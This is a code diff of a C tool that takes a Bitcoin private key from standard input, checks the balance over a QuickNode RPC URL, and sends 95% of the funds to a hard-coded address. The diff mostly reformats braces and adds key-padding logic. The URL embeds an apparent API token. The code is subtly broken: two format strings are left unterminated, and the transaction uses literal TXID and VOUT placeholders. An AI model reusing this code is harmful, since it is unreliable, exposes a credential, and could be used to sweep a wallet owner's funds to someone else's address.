@@ -5,17 +5,15 @@
 #include <json-c/json.h>
 
 #define RPC_URL "https://radial-alpha-putty.btc.quiknode.pro/95ab8ad003e59cd2ad2947b0e91a4cb79a666f39" // QuickNode URL
-#define MY_ADDRESS "3989LYRH3bauPigYs8HSTAg8kGGNHtvgjF"                                                // Replace with your destination address
+#define MY_ADDRESS "3989LYRH3bauPigYs8HSTAg8kGGNHtvgjF" // Replace with your destination address
 #define PERCENTAGE 0.95
 
-struct Response
-{
+struct Response {
     char *data;
     size_t size;
 };
 
-static size_t write_callback(void *contents, size_t size, size_t nmemb, void *userp)
-{
+static size_t write_callback(void *contents, size_t size, size_t nmemb, void *userp) {
     size_t realsize = size * nmemb;
     struct Response *resp = (struct Response *)userp;
     char *ptr = realloc(resp->data, resp->size + realsize + 1);
@@ -26,8 +24,7 @@ static size_t write_callback(void *contents, size_t size, size_t nmemb, void *us
     return realsize;
 }
 
-double get_balance(CURL *curl)
-{
+double get_balance(CURL *curl) {
     struct Response resp = {0};
     struct curl_slist *headers = curl_slist_append(NULL, "Content-Type: application/json");
 
@@ -45,11 +42,9 @@ double get_balance(CURL *curl)
     json_object_object_get_ex(parsed_json, "result", &result);
 
     double balance = 0.0;
-    if (result)
-    {
+    if (result) {
         int array_len = json_object_array_length(result);
-        for (int i = 0; i < array_len; i++)
-        {
+        for (int i = 0; i < array_len; i++) {
             struct json_object *utxo = json_object_array_get_idx(result, i);
             struct json_object *amount;
             json_object_object_get_ex(utxo, "amount", &amount);
@@ -64,8 +59,7 @@ double get_balance(CURL *curl)
     return balance;
 }
 
-void make_transfer(CURL *curl, const char *amount, const char *private_key)
-{
+void make_transfer(CURL *curl, const char *amount, const char *private_key) {
     struct Response resp = {0};
     struct curl_slist *headers = curl_slist_append(NULL, "Content-Type: application/json");
 
@@ -73,8 +67,7 @@ void make_transfer(CURL *curl, const char *amount, const char *private_key)
     char create_tx_json[1024];
     snprintf(create_tx_json, sizeof(create_tx_json),
              "{\"jsonrpc\":\"1.0\",\"id\":\"createtx\",\"method\":\"createrawtransaction\",\"params\":[[{\"txid\":\"<TXID>\",\"vout\":<VOUT>}],{\"%s\":%s}]}\",
-             MY_ADDRESS,
-             amount);
+             MY_ADDRESS, amount);
 
     curl_easy_setopt(curl, CURLOPT_POSTFIELDS, create_tx_json);
     curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
@@ -82,8 +75,7 @@ void make_transfer(CURL *curl, const char *amount, const char *private_key)
     curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)&resp);
 
     CURLcode res = curl_easy_perform(curl);
-    if (res != CURLE_OK)
-    {
+    if (res != CURLE_OK) {
         fprintf(stderr, "Failed to create raw transaction: %s\n", curl_easy_strerror(res));
         return;
     }
@@ -100,13 +92,11 @@ void make_transfer(CURL *curl, const char *amount, const char *private_key)
     char sign_tx_json[1024];
     snprintf(sign_tx_json, sizeof(sign_tx_json),
              "{\"jsonrpc\":\"1.0\",\"id\":\"signtx\",\"method\":\"signrawtransactionwithkey\",\"params\":[\"%s\",[\"%s\"]]}\",
-             raw_tx,
-             private_key);
+             raw_tx, private_key);
 
     curl_easy_setopt(curl, CURLOPT_POSTFIELDS, sign_tx_json);
     res = curl_easy_perform(curl);
-    if (res != CURLE_OK)
-    {
+    if (res != CURLE_OK) {
         fprintf(stderr, "Failed to sign transaction: %s\n", curl_easy_strerror(res));
         return;
     }
@@ -128,12 +118,9 @@ void make_transfer(CURL *curl, const char *amount, const char *private_key)
 
     curl_easy_setopt(curl, CURLOPT_POSTFIELDS, send_tx_json);
     res = curl_easy_perform(curl);
-    if (res == CURLE_OK)
-    {
+    if (res == CURLE_OK) {
         printf("Transaction sent successfully: %s\n", resp.data);
-    }
-    else
-    {
+    } else {
         fprintf(stderr, "Failed to send transaction: %s\n", curl_easy_strerror(res));
     }
 
@@ -141,8 +128,7 @@ void make_transfer(CURL *curl, const char *amount, const char *private_key)
     curl_slist_free_all(headers);
 }
 
-int main()
-{
+int main() {
     CURL *curl;
     char private_key[100];
 
@@ -150,9 +136,22 @@ int main()
     fgets(private_key, sizeof(private_key), stdin);
     private_key[strcspn(private_key, "\n")] = 0;
 
+    // Preprocess private key to handle different formats
+    if (strncmp(private_key, "0x", 2) == 0 || strncmp(private_key, "0X", 2) == 0) {
+        memmove(private_key, private_key + 2, strlen(private_key) - 1);
+    }
+
+    // Pad short private keys to 64 characters
+    int len = strlen(private_key);
+    if (len < 64) {
+        char padded_key[65] = {0};
+        memset(padded_key, '0', 64 - len);
+        strcat(padded_key, private_key);
+        strcpy(private_key, padded_key);
+    }
+
     curl = curl_easy_init();
-    if (curl)
-    {
+    if (curl) {
         curl_easy_setopt(curl, CURLOPT_URL, RPC_URL);
 
         double balance = get_balance(curl);
